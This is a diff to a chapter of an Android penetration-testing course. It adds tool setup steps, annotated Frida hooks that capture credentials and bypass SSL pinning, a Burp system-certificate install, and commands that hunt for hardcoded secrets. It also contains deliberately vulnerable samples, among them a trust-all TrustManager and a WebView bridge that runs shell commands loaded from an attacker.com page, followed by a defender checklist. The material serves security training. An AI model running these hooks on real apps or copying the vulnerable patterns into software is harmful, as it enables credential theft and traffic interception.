@@ -38,6 +38,219 @@ architecture. Everything else follows from it.
 
 ---
 
+## WINDOWS SETUP
+
+This chapter uses four distinct tools. **None of them install cleanly with a single command** — read this section in full before touching the drills. Budget 2–4 hours the first time. Do it once, document what worked.
+
+### Tools Used in This Chapter
+
+| Tool | What it does | Install method |
+|------|-------------|----------------|
+| apktool | Decodes APK to smali + readable XML | Manual JAR install (see below) |
+| jadx / jadx-gui | Decompiles DEX bytecode to Java | Manual ZIP release (see below) |
+| adb (Android Debug Bridge) | Shell access to device/emulator | Android Platform Tools ZIP |
+| frida-tools | Runtime instrumentation | pip (Python) |
+| objection | Frida wrapper with pre-built Android commands | pip (Python) |
+| Android Emulator | Virtual Android device for testing | Android Studio install |
+
+---
+
+### Step 1 — Install Java (required by apktool AND jadx)
+
+apktool and jadx are Java programs. Java must be installed and on your PATH before either tool will run. This is the most common tooling wall.
+
+```powershell
+# Option A: Install via winget (Windows 11, run as Administrator):
+winget install Microsoft.OpenJDK.21
+
+# Option B: Download directly (no winget required):
+# https://adoptium.net/temurin/releases/?version=21&os=windows&arch=x64&package=jdk
+# Download the .msi installer. Run it. Check "Add to PATH" during install.
+```
+
+**Verify Java is on PATH (run in a NEW PowerShell window after install):**
+```powershell
+java -version
+```
+
+**Expected output:**
+```
+openjdk version "21.0.x" 2024-xx-xx
+OpenJDK Runtime Environment ...
+```
+
+**Failure looks like: `java is not recognized as an internal or external command` — means Java is not on your PATH. Fix: open System Properties → Environment Variables → Path → Add the Java bin folder (e.g., `C:\Program Files\Eclipse Adoptium\jdk-21.x.x\bin`). Reopen PowerShell.**
+
+> **Admin rights required**: the Adoptium MSI installer requires Administrator.
+
+---
+
+### Step 2 — Install apktool
+
+apktool is not on pip or winget. It is a wrapper script + JAR file that you place manually.
+
+```powershell
+# 1. Create a tools directory:
+mkdir C:\tools\apktool
+
+# 2. Download the latest apktool JAR:
+# https://apktool.org/docs/install/
+# Direct link: https://bitbucket.org/iBotPeaches/apktool/downloads/
+# Download: apktool_X.X.X.jar  (e.g., apktool_2.9.3.jar)
+# Save to: C:\tools\apktool\apktool.jar
+
+# 3. Download the Windows wrapper script:
+# https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat
+# Save to: C:\tools\apktool\apktool.bat
+
+# 4. Add C:\tools\apktool to PATH:
+# System Properties → Environment Variables → Path → New → C:\tools\apktool
+```
+
+**Verify:**
+```powershell
+apktool --version
+```
+
+**Expected output:** `Apktool v2.9.x`
+
+**Failure looks like: `Error occurred during initialization of VM` — means Java is missing or wrong version. Fix: verify `java -version` works first.**
+
+---
+
+### Step 3 — Install jadx
+
+jadx is a ZIP release with its own launcher scripts. No PATH juggling required beyond extracting it.
+
+```powershell
+# Download latest release ZIP from GitHub:
+# https://github.com/skylot/jadx/releases/latest
+# File: jadx-X.X.X.zip  (e.g., jadx-1.5.0.zip)
+# Extract to: C:\tools\jadx\
+
+# The ZIP contains:
+#   bin/jadx.bat       ← CLI decompiler
+#   bin/jadx-gui.bat   ← GUI decompiler (use this)
+#   lib/               ← all Java deps included
+
+# Add C:\tools\jadx\bin to PATH (same process as apktool above)
+```
+
+**Verify:**
+```powershell
+jadx --version
+```
+
+**Expected output:** `jadx-1.5.x`
+
+**Failure looks like: `'jadx' is not recognized` — means the bin folder is not on PATH, or PATH was not refreshed. Fix: close and reopen PowerShell, or run `$env:PATH += ";C:\tools\jadx\bin"` in the current session.**
+
+---
+
+### Step 4 — Install Android Platform Tools (adb)
+
+adb ships as part of Android Platform Tools, a standalone ZIP — no Android Studio needed.
+
+```powershell
+# Download Platform Tools:
+# https://developer.android.com/tools/releases/platform-tools
+# File: platform-tools-latest-windows.zip
+# Extract to: C:\tools\platform-tools\
+
+# Add C:\tools\platform-tools to PATH
+```
+
+**Verify:**
+```powershell
+adb version
+```
+
+**Expected output:** `Android Debug Bridge version 1.0.41`
+
+**Failure looks like: `adb is not recognized` — PATH not set. Fix: same PATH process as above.**
+
+---
+
+### Step 5 — Install frida-tools and objection (pip)
+
+These are standard Python packages. You already have Python. These are the easiest installs in this chapter.
+
+```powershell
+# Install frida-tools:
+pip install frida-tools
+
+# Install objection:
+pip install objection
+
+# If you have a venv for your tools, activate it first:
+# .\venv\Scripts\activate
+```
+
+**Verify frida:**
+```powershell
+frida --version
+```
+
+**Expected output:** `16.x.x`
+
+**Verify objection:**
+```powershell
+objection version
+```
+
+**Expected output:** `objection: x.x.x`
+
+**Failure looks like: `No module named 'frida'` after install — means pip installed to a different Python than the one on your PATH. Fix: use `python -m pip install frida-tools` instead of bare `pip`.**
+
+---
+
+### Step 6 — Android Emulator (for the drills)
+
+You need a rooted Android device OR an Android emulator. For the drills, use an emulator.
+
+```powershell
+# Install Android Studio (includes the emulator):
+# https://developer.android.com/studio
+# During setup, install: Android SDK, Android Emulator, Android Virtual Device
+
+# After install, create an AVD (Android Virtual Device):
+# Android Studio → More Actions → Virtual Device Manager → Create Device
+# Recommended: Pixel 6, API 33 (Android 13), x86_64 image
+# For root access: choose a "Google APIs" image, NOT "Google Play"
+# (Google Play images block root)
+```
+
+> **Admin rights required**: Android Studio installer requires Administrator.
+
+**Verify emulator launches:**
+```powershell
+# Start the emulator from the AVD manager, then:
+adb devices
+```
+
+**Expected output:**
+```
+List of devices attached
+emulator-5554   device
+```
+
+**Failure looks like: `List of devices attached` with nothing below it — emulator is not running or adb can't see it. Fix: wait 30 seconds for the emulator to boot, then retry.**
+
+---
+
+### WSL2 Note
+
+None of the tools in this chapter strictly require WSL2. All commands in this chapter run in PowerShell or Git Bash on Windows. However, if you want to run Linux-native tools (some Frida scripts, openssl commands for cert manipulation), install WSL2:
+
+```powershell
+# Install WSL2 (run as Administrator, requires reboot):
+wsl --install
+```
+
+The Burp cert manipulation commands in Section 4 that use `openssl` can be run in WSL2 if you do not have openssl on Windows. WSL2 Ubuntu includes openssl by default.
+
+---
+
 ## Section 1 — Android Architecture
 
 Android is a modified Linux kernel with an application framework layered
@@ -225,7 +438,7 @@ The manifest declares EVERYTHING the app does and CAN do:
 - Intent filters (what Intents the app handles)
 - Minimum and target API level
 
-```
+```bash
 # Decode binary AndroidManifest.xml:
 # Binary XML cannot be read directly — must decode
 # apktool does this automatically during decompile
@@ -233,13 +446,35 @@ The manifest declares EVERYTHING the app does and CAN do:
 # Manual decode:
 adb backup -noapk com.example.app    # pulls backup, contains manifest
 # OR use aapt (Android Asset Packaging Tool):
-aapt dump badging app.apk
-aapt dump xmltree app.apk AndroidManifest.xml
+aapt dump badging app.apk            # dump full app badge info including permissions
+aapt dump xmltree app.apk AndroidManifest.xml  # dump manifest as XML tree
 
-# Or decode with apktool (preferred):
+# Or decode with apktool (preferred — decodes everything at once):
 apktool d app.apk -o output_dir
 cat output_dir/AndroidManifest.xml
 ```
+
+### Expected Output
+
+**Success looks like:**
+```
+I: Using Apktool 2.9.x on app.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file: ...
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+```
+Then `output_dir/AndroidManifest.xml` exists and is readable plain text.
+
+**Failure looks like: `brut.androlib.AndrolibException: Could not decode arsc file` — means the APK uses a newer resource format than your apktool version. Fix: download the latest apktool JAR. Add `-r` flag to skip resources: `apktool d app.apk -o output_dir -r`**
+
+**Failure looks like: `Exception in thread "main" java.lang.UnsupportedClassVersionError` — means your Java version is too old. Fix: reinstall Java 21+ from Adoptium.**
 
 **What to look for in the manifest:**
 
@@ -310,11 +545,8 @@ Static analysis = read the APK without running it.
 
 apktool decodes the APK to smali (DEX assembly) and decodes binary XML.
 
-```
-# Install apktool:
-# https://apktool.org/
-
-# Decompile:
+```bash
+# Decompile the APK:
 apktool d target.apk -o output/
 
 # Output structure:
@@ -325,35 +557,57 @@ output/
   assets/                ← raw assets
   original/              ← original META-INF
 
-# Smali is human-readable DEX assembly:
-.method public onCreate(Landroid/os/Bundle;)V
-    .registers 3
-    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
-    const/high16 v0, 0x7f040000
-    invoke-virtual {p0, v0}, Lcom/example/app/MainActivity;->setContentView(I)V
-    return-void
+# Smali is human-readable DEX assembly.
+# You normally don't read smali directly — jadx gives you Java.
+# Smali matters when you need to MODIFY the APK (patch a method, bypass a check).
+.method public onCreate(Landroid/os/Bundle;)V  # method signature: returns void (V)
+    .registers 3                               # this method uses 3 registers (p0=this, p1=Bundle arg, v0=scratch)
+    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V  # call super.onCreate(savedInstanceState)
+    const/high16 v0, 0x7f040000               # load layout resource ID into v0
+    invoke-virtual {p0, v0}, Lcom/example/app/MainActivity;->setContentView(I)V    # call this.setContentView(v0)
+    return-void                               # method returns, no value
 .end method
 ```
+
+### Expected Output
+
+**Success looks like:**
+```
+I: Using Apktool 2.9.x on target.apk
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+```
+The `output/` directory is created and `output/AndroidManifest.xml` is readable plain text.
+
+**Failure looks like: `brut.common.BrutException: could not exec` — means apktool.bat is missing or Java is not on PATH. Fix: verify `java -version` in the SAME PowerShell window.**
 
 ### Step 2: Decompile to Java with jadx
 
 jadx takes the APK (or .dex file) and decompiles it to approximate Java.
 Much more readable than smali.
 
-```
-# Install jadx:
-# https://github.com/skylot/jadx/releases
-
+```bash
 # GUI (recommended for navigation):
 jadx-gui target.apk
 
-# CLI (for scripted analysis):
+# CLI (for scripted analysis — outputs Java source files):
 jadx -d output_java/ target.apk
 
 # Output: Java source files under output_java/sources/
 # Navigate the package structure in jadx-gui
 # Use Ctrl+F to search for strings, class names, method calls
 ```
+
+### Expected Output
+
+**Success looks like:**
+jadx-gui opens a window. Left panel shows the package tree (e.g., `com.example.app`). Clicking any class shows decompiled Java in the right panel.
+
+CLI success: `output_java/sources/com/example/app/MainActivity.java` exists and contains readable Java.
+
+**Failure looks like: `ERROR - 'null' top level class` on many classes — means heavy obfuscation. Fix: the code is still there but class/method names are `a`, `b`, `c`. Use string search to find interesting code by what it says, not what it's named.**
+
+**Failure looks like: jadx-gui shows a blank window or crashes immediately — means Java heap is too small for a large APK. Fix: edit `jadx-gui.bat`, change `-Xmx1g` to `-Xmx4g`.**
 
 **jadx-gui workflow:**
 1. Open APK
@@ -383,23 +637,42 @@ grep -A2 'exported="true"' output/AndroidManifest.xml | grep 'activity'
 grep -E "READ_SMS|RECORD_AUDIO|ACCESS_FINE_LOCATION|BIND_ACCESSIBILITY|READ_CALL_LOG" output/AndroidManifest.xml
 ```
 
+### Expected Output
+
+**Success looks like:** Lines from the manifest file printed to terminal. Even if grep finds nothing, it exits silently — that means no exported components or no dangerous permissions (good for the target, less interesting for you).
+
+**Failure looks like: `No such file or directory: output/AndroidManifest.xml` — apktool step failed or you are running the command from the wrong directory. Fix: run `ls output/` to confirm the file exists.**
+
 ### Step 4: Hardcoded Secrets Hunt
 
 ```bash
 # In decompiled Java (jadx output):
+# -r = recursive, -i = case insensitive, searching for credential-related strings
 grep -r "password\|passwd\|secret\|apikey\|api_key\|token\|bearer" output_java/ -i
+
+# Find hardcoded URLs (exclude schema/W3C URLs which are framework boilerplate):
 grep -r "http://\|https://" output_java/ | grep -v "//schemas\|//www.w3.org\|//android"
 
-# In assets/ (common for React Native, Flutter, Cordova apps):
+# In assets/ (common for React Native, Flutter, Cordova apps — JS bundles live here):
 find output/assets -name "*.js" | xargs grep -i "password\|secret\|apikey\|http://"
 find output/assets -name "*.json" | xargs grep -i "key\|secret\|token\|url"
 
 # In resources:
 grep -r "key\|secret\|password\|token" output/res/ -i
 
-# In native libraries (requires strings tool):
+# In native libraries (requires strings tool — extracts printable strings from binary):
 find output/lib -name "*.so" | xargs strings | grep -iE "http://|password|secret|key="
 ```
+
+### Expected Output
+
+**Success looks like:**
+```
+output_java/sources/com/example/app/Config.java:    private static final String API_KEY = "AIzaSy...";
+output_java/sources/com/example/app/NetworkManager.java:    String url = "http://api.example.com/v1/login";
+```
+
+**Failure looks like:** No output — either no hardcoded secrets (unlikely for a vulnerable sample app) or the strings are obfuscated/encrypted. Fix: search for the decryption function instead — look for `decrypt`, `deobfuscate`, `AES`, `Base64.decode`.**
 
 ### Step 5: Exported Component Enumeration
 
@@ -414,10 +687,12 @@ For each exported component, determine:
 public class DeepLinkActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        Uri data = getIntent().getData();
-        // BUG: no validation of 'data' URI
+        Uri data = getIntent().getData();   // get the URI from the Intent that started this Activity
+        // BUG: no validation of 'data' URI — attacker controls this value entirely
         String url = data.toString();
-        webView.loadUrl(url);   // <- deeplink injection -> open attacker URL in WebView
+        webView.loadUrl(url);   // loads attacker-supplied URL in the app's WebView context
+        // → deeplink injection: if WebView has JavascriptInterface = RCE
+        // → if WebView has file:// access enabled = local file read
     }
 }
 
@@ -475,6 +750,26 @@ adb shell screencap /sdcard/screen.png
 adb pull /sdcard/screen.png
 ```
 
+### Expected Output
+
+**`adb devices` success looks like:**
+```
+List of devices attached
+emulator-5554   device
+```
+
+**Failure looks like: `emulator-5554   offline` — emulator is still booting. Wait 30–60 seconds, retry.**
+
+**Failure looks like: `adb: command not found` — Platform Tools not on PATH. Fix: see Windows Setup section.**
+
+**`adb install app.apk` success looks like:**
+```
+Performing Streamed Install
+Success
+```
+
+**Failure looks like: `INSTALL_FAILED_NO_MATCHING_ABIS` — the APK's native libs don't match your emulator architecture. Fix: create an x86_64 emulator AVD, or download the x86_64 APK variant.**
+
 ### Frida: Dynamic Instrumentation
 
 Frida is the best tool for Android runtime analysis. It lets you inject
@@ -487,77 +782,124 @@ pip install frida-tools
 
 # Download frida-server for target architecture:
 # https://github.com/frida/frida/releases
-# e.g., frida-server-16.x.x-android-arm64.xz
+# For the x86_64 emulator, download: frida-server-XX.X.X-android-x86_64.xz
+# For a real ARM64 phone, download:  frida-server-XX.X.X-android-arm64.xz
+# IMPORTANT: frida-server version MUST match your frida-tools version
+#   Check with: frida --version
+#   Download matching server from: https://github.com/frida/frida/releases
+
+# Extract the .xz file (use 7-Zip on Windows, or WSL2: xz -d file.xz)
 
 # Push and start frida-server on device (requires root):
-adb push frida-server /data/local/tmp/
-adb shell chmod 755 /data/local/tmp/frida-server
-adb shell /data/local/tmp/frida-server &
+adb push frida-server /data/local/tmp/       # copy server binary to device
+adb shell chmod 755 /data/local/tmp/frida-server  # make it executable
+adb shell /data/local/tmp/frida-server &     # start it in the background
 
 # Verify connection:
 frida-ps -U    # list processes on USB-connected device
 
 # Attach to running app:
-frida -U -p <pid> -l hook_script.js
-frida -U -n "com.example.app" -l hook_script.js
+frida -U -p <pid> -l hook_script.js          # attach by process ID
+frida -U -n "com.example.app" -l hook_script.js  # attach by package name
 
 # Spawn (restart app with Frida attached from launch):
 frida -U -f com.example.app -l hook_script.js --no-pause
 ```
 
+### Expected Output
+
+**`frida-ps -U` success looks like:**
+```
+  PID  Name
+-----  -------------------------------------------------------
+  123  com.example.app
+  456  com.android.systemui
+  ...
+```
+
+**Failure looks like: `Failed to enumerate processes: unable to connect to remote frida-server` — frida-server is not running on the device. Fix: run `adb shell /data/local/tmp/frida-server &` again, verify with `adb shell ps | grep frida`.**
+
+**Failure looks like: `Unable to connect to remote frida-server: version mismatch` — your frida-tools version and frida-server version differ. Fix: download the exact matching frida-server version from GitHub releases.**
+
 **Basic Frida hook — intercept a method:**
 
 ```javascript
 // hook_basic.js — log all calls to Activity.onCreate
-Java.perform(function() {
-    var Activity = Java.use("android.app.Activity");
+Java.perform(function() {                    // wait for the Java VM to be ready
+    var Activity = Java.use("android.app.Activity");  // get a handle to the Activity class
     
+    // Replace onCreate with our wrapper (overload specifies the exact method signature):
     Activity.onCreate.overload("android.os.Bundle").implementation = function(savedInstanceState) {
         console.log("[+] Activity.onCreate called");
-        console.log("    Class: " + this.$className);
-        // Call original implementation:
+        console.log("    Class: " + this.$className);  // log which Activity subclass this is
+        // Call original implementation (skipping this would break the app):
         this.onCreate(savedInstanceState);
     };
 });
 ```
+
+### Expected Output
+
+**Success looks like** (in the frida terminal when navigating the app):
+```
+[+] Activity.onCreate called
+    Class: com.example.app.MainActivity
+[+] Activity.onCreate called
+    Class: com.example.app.LoginActivity
+```
+
+**Failure looks like: `Error: java.lang.ClassNotFoundException: android.app.Activity` — wrong class path. Fix: use jadx to find the exact class name including package.**
 
 **Hook to extract credentials from SharedPreferences:**
 
 ```javascript
 // hook_sharedprefs.js — capture credentials stored in SharedPreferences
 Java.perform(function() {
+    // SharedPreferencesImpl is the concrete implementation of SharedPreferences
     var SharedPreferences = Java.use("android.app.SharedPreferencesImpl");
     
+    // Hook getString — called every time the app reads a string value from prefs
     SharedPreferences.getString.overload("java.lang.String", "java.lang.String")
         .implementation = function(key, defValue) {
-            var result = this.getString(key, defValue);
+            var result = this.getString(key, defValue);  // call original, get the real value
+            // Only log keys that look like credentials (reduce noise):
             if (key.toLowerCase().includes("password") ||
                 key.toLowerCase().includes("token") ||
                 key.toLowerCase().includes("secret")) {
                 console.log("[CREDENTIAL] Key: " + key + " = " + result);
             }
-            return result;
+            return result;  // return original value — app behaves normally
         };
 });
 ```
+
+### Expected Output
+
+**Success looks like** (when the app reads credentials):
+```
+[CREDENTIAL] Key: auth_token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+[CREDENTIAL] Key: password = hunter2
+```
+
+**Failure looks like: no output even after logging in — the app may use a different storage mechanism (SQLite, EncryptedSharedPreferences, Keystore). Fix: hook SQLiteDatabase.rawQuery and Cipher.doFinal instead.**
 
 **Hook to dump network traffic (before encryption):**
 
 ```javascript
 // hook_http.js — intercept OkHttp requests
 Java.perform(function() {
-    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
+    var OkHttpClient = Java.use("okhttp3.OkHttpClient");  // OkHttp is the most common HTTP lib
     var Request = Java.use("okhttp3.Request");
     
     // Hook the intercept chain to log all requests:
     var Interceptor = Java.use("okhttp3.Interceptor");
     // (More complex — see full OkHttp hook in drill files)
     
-    // Quick alternative — hook URL.openConnection:
+    // Quick alternative — hook URL.openConnection (catches older HttpURLConnection):
     var URL = Java.use("java.net.URL");
     URL.openConnection.overload().implementation = function() {
-        console.log("[HTTP] URL opened: " + this.toString());
-        return this.openConnection();
+        console.log("[HTTP] URL opened: " + this.toString());  // log every URL before connection
+        return this.openConnection();  // proceed with original connection
     };
 });
 ```
@@ -602,6 +944,26 @@ memory search --string "password"
 memory dump all /tmp/heap.bin
 ```
 
+### Expected Output
+
+**`objection -g com.example.app explore` success looks like:**
+```
+     _     _         _   _
+ ___| |_  |_|___ ___| |_|_|___ ___
+| . | . | | | -_|  _|  _| | . |   |
+|___|___|_| |___|___|_|_| |___|_|_|
+          |___|(object)inject(ion)
+
+     Runtime Mobile Exploration
+        by: @leonjza from @nowsecure
+
+[tab] for command suggestions
+
+com.example.app on (Android: 13) [usb] #
+```
+
+**Failure looks like: `Unable to find target package com.example.app` — app is not installed or package name is wrong. Fix: verify with `adb shell pm list packages | grep example`.**
+
 ### Burp Suite Proxy with Android
 
 To intercept HTTPS traffic from Android apps, you need to:
@@ -634,16 +996,24 @@ PROXY SETUP:
    #   b) Bypass cert pinning at runtime (Frida/objection)
    #   c) Install cert as SYSTEM cert (requires root)
 
-# Install as system cert (rooted device):
-openssl x509 -inform DER -in burp_cert.der -out burp_cert.pem
-CERT_HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp_cert.pem | head -1)
-cp burp_cert.pem ${CERT_HASH}.0
-adb root
-adb remount
-adb push ${CERT_HASH}.0 /system/etc/security/cacerts/
-adb shell chmod 644 /system/etc/security/cacerts/${CERT_HASH}.0
-adb reboot
+# Install as system cert (rooted device / emulator with Google APIs image):
+openssl x509 -inform DER -in burp_cert.der -out burp_cert.pem  # convert DER to PEM format
+CERT_HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp_cert.pem | head -1)  # compute legacy hash (Android uses this for filenames)
+cp burp_cert.pem ${CERT_HASH}.0  # rename to the hash-based filename Android expects
+adb root             # restart adb as root (only works on rooted/debug builds)
+adb remount          # remount /system as read-write
+adb push ${CERT_HASH}.0 /system/etc/security/cacerts/  # install as system-trusted CA
+adb shell chmod 644 /system/etc/security/cacerts/${CERT_HASH}.0  # set correct permissions
+adb reboot           # reboot for the cert to take effect
 ```
+
+### Expected Output
+
+**Success looks like:** After device reboot, open the browser on the device and navigate to `http://burp/`. If Burp intercepts the request, the proxy is working. In Burp's HTTP history, you will see requests from the Android device.
+
+**Failure looks like:** Burp history is empty despite the app making requests — the app is using certificate pinning. Fix: proceed to Section 6 (SSL Pinning Bypass).
+
+**Failure looks like: `error: device offline` after `adb root` — your emulator image does not support root. Fix: create a new AVD using a "Google APIs" image (NOT "Google Play Store" image).**
 
 ---
 
@@ -729,18 +1099,19 @@ even without defeating certificate pinning.
 
 ```java
 // VULNERABLE: trusts all certificates
+// This is the "trust everything" antipattern — common in dev code that ships to prod
 TrustManager[] trustAllCerts = new TrustManager[] {
     new X509TrustManager() {
-        public X509Certificate[] getAcceptedIssuers() { return null; }
-        public void checkClientTrusted(X509Certificate[] certs, String authType) {}
-        public void checkServerTrusted(X509Certificate[] certs, String authType) {}
+        public X509Certificate[] getAcceptedIssuers() { return null; }  // no issuers = accept all
+        public void checkClientTrusted(X509Certificate[] certs, String authType) {}   // empty = no check
+        public void checkServerTrusted(X509Certificate[] certs, String authType) {}   // empty = no check
         // Empty implementation = trust everything = MitM trivial
     }
 };
 
 SSLContext sc = SSLContext.getInstance("TLS");
-sc.init(null, trustAllCerts, new java.security.SecureRandom());
-HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+sc.init(null, trustAllCerts, new java.security.SecureRandom());  // install the permissive trust manager
+HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());  // make it the default for all HTTPS
 
 // Also look for:
 HostnameVerifier allHostsValid = (hostname, session) -> true;
@@ -754,19 +1125,19 @@ HostnameVerifier allHostsValid = (hostname, session) -> true;
 
 ```java
 // VULNERABLE: exposes Java methods to JavaScript in WebView
-webView.addJavascriptInterface(new JavaBridge(), "Android");
+webView.addJavascriptInterface(new JavaBridge(), "Android");  // "Android" = JS object name
 
 class JavaBridge {
-    @JavascriptInterface
+    @JavascriptInterface  // annotation required — marks method as callable from JS
     public String executeCommand(String cmd) {
         // CRITICAL: this executes SHELL COMMANDS from JavaScript!
-        Process p = Runtime.getRuntime().exec(cmd);
-        return readStream(p.getInputStream());
+        Process p = Runtime.getRuntime().exec(cmd);  // run cmd as a shell process
+        return readStream(p.getInputStream());         // return stdout to JS caller
     }
 }
 
-webView.setJavaScriptEnabled(true);
-webView.loadUrl("https://attacker.com/xss_payload.html");
+webView.setJavaScriptEnabled(true);                             // JS must be enabled
+webView.loadUrl("https://attacker.com/xss_payload.html");      // load attacker-controlled page
 // The XSS payload calls: Android.executeCommand("id")
 // → Command execution via WebView JavaScript
 ```
@@ -791,10 +1162,10 @@ is potentially exploitable if the WebView loads remote content.
 
 public class CallbackActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
-        Uri data = getIntent().getData();
-        // NO VALIDATION: loads any URL from the deep link
+        Uri data = getIntent().getData();                   // get the URI from the deep link Intent
+        // NO VALIDATION: loads any URL from the deep link — attacker controls 'redirect' param
         String url = data.getQueryParameter("redirect");
-        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
+        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));  // open URL in browser — open redirect
         // → open attacker URL in browser, or:
         webView.loadUrl(url);
         // → load attacker-controlled page in app's WebView context
@@ -827,6 +1198,19 @@ frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida \
 # Or download the script for offline use:
 # https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/
 ```
+
+### Expected Output
+
+**Success looks like:**
+```
+[*] Frida instrumentation started
+[Android Emulator 5554::com.victim.app]-> [+] TrustManager found
+[+] Hooking Conscrypt TrustManager
+[+] SSLContext.init() calls are now intercepted
+```
+Then in Burp, requests from the app start appearing in HTTP History.
+
+**Failure looks like: `Script loaded successfully` but Burp still shows nothing — the app uses a custom pinning implementation the universal script doesn't cover. Proceed to Manual Bypass below.**
 
 **What it bypasses:**
 - OkHttp3 CertificatePinner
@@ -864,6 +1248,7 @@ pinning implementation. Find it manually:
 ```javascript
 // targeted_bypass.js — hook specific custom pinning class
 Java.perform(function() {
+    // Use the exact class path from jadx — adjust to match what you found:
     var CustomPinner = Java.use("com.victim.app.security.CertificatePinnerImpl");
     
     // Override the verify method to always pass:
@@ -873,14 +1258,20 @@ Java.perform(function() {
             return true;   // always return true = pin check passes
         };
     
-    // Or: overload checkServerTrusted to do nothing
+    // Or: overload checkServerTrusted to do nothing (no throw = trust accepted):
     CustomPinner.checkServerTrusted.overload("[Ljava.security.cert.X509Certificate;", "java.lang.String")
         .implementation = function(chain, authType) {
             console.log("[BYPASS] checkServerTrusted bypassed");
-            // Return without throwing = trust accepted
+            // Return without throwing = trust accepted (original would throw CertificateException)
         };
 });
 ```
+
+### Expected Output
+
+**Success looks like:** The hook script loads without errors, and when the app makes an HTTPS request you see `[BYPASS] SSL pinning bypassed for: api.victim.com` in the Frida console. Burp HTTP history shows the decrypted request.
+
+**Failure looks like: `TypeError: CustomPinner.verify is not a function` — the method name or signature is wrong. Fix: in jadx, find the exact method name in the pinning class and check the exact parameter types. Adjust the `.overload()` arguments to match.**
 
 ---
 
@@ -925,6 +1316,28 @@ PHASE 5 — REPORT:
 
 ---
 
+## DEFENDER TAKEAWAY
+
+You built the attack toolkit. Now use the same knowledge to protect your company's Android-connected environment. These are Monday-morning actions.
+
+- **Audit your MDM policy for sideloading.** If "Unknown sources" or "Install unknown apps" is permitted on corporate devices, any employee can install a malicious APK. Use your MDM (Intune, Jamf, etc.) to enforce this. On Windows, check Intune → Devices → Configuration Profiles → Android Enterprise → App.
+
+- **Ban accessibility service permissions in your MDM policy.** `BIND_ACCESSIBILITY_SERVICE` is how commercial stalkerware and banking trojans read every screen and keypress. No legitimate corporate app needs it. Blocklist it via your MDM app vetting policy.
+
+- **Run MobSF on every APK before it touches your corporate WiFi.** MobSF (Mobile Security Framework) is an open-source static analyser — `pip install mobsf` or run via Docker. Automate APK uploads from your app catalog. Fail any APK with exported Activities that access data, hardcoded credentials, or `setJavaScriptEnabled`.
+
+- **Enforce network traffic inspection at the corporate WiFi perimeter.** Because Frida-based SSL pinning bypass works at runtime, network-level inspection (Palo Alto SSL decryption, Zscaler) gives you a second layer that app-level pinning does not protect against. Log all HTTPS CONNECT requests from mobile devices.
+
+- **Windows detection — monitor for Android tooling on corporate machines.** If an employee is running adb, frida, or objection on their Windows workstation, it warrants investigation. Create a Windows Defender Application Control (WDAC) audit rule for `adb.exe`. Event ID **4688** (Process Creation, requires audit policy enabled) will log it: look for `CommandLine` containing `adb` or `frida`.
+
+- **Require certificate pinning in all internally developed Android apps.** Use the Android `network_security_config.xml` approach — it is enforced by the OS, not bypassable without root, and costs zero lines of Java. Provide a template to your dev team.
+
+- **Check for exported components in every internal app build.** Add a mandatory pre-release step: `apktool d app.apk -o decoded/ && grep -i 'exported="true"' decoded/AndroidManifest.xml`. Any exported component must be justified in the release notes.
+
+- **Windows-specific: Event ID 7045 (new service installed) and 4698 (scheduled task created) catch Android malware persistence mechanisms when a compromised device syncs to a corporate Windows host.** Enable these in your SIEM. Android malware that moves laterally to Windows often installs a service or scheduled task.
+
+---
+
 ## Key Terms (Add to Glossary)
 
 | Term | Definition |
@@ -946,6 +1359,9 @@ PHASE 5 — REPORT:
 | **ContentProvider** | Android component exposing structured data access; common path traversal vulnerability surface |
 | **WebView JavascriptInterface** | Bridge exposing Java methods to JavaScript in a WebView; can enable RCE via XSS |
 | **Deep link** | URL scheme handled by an exported Activity; injection via unvalidated parameters |
+| **smali** | Human-readable assembly language for DEX bytecode; output of apktool decompilation |
+| **frida-server** | Native binary deployed to the Android device that Frida tools connect to |
+| **adb** | Android Debug Bridge; command-line tool for device communication, shell access, file transfer |
 
 ---
 
@@ -991,5 +1407,5 @@ look for the places where trust assumptions break.
 
 ---
 
-— Every app is a BINARY waiting to surrender its logic —
-the runtime instrumentation bends it to the analyst's will
+— The APK SURRENDERS its secrets to patient smali —
+runtime instrumentation bends the trust model cold
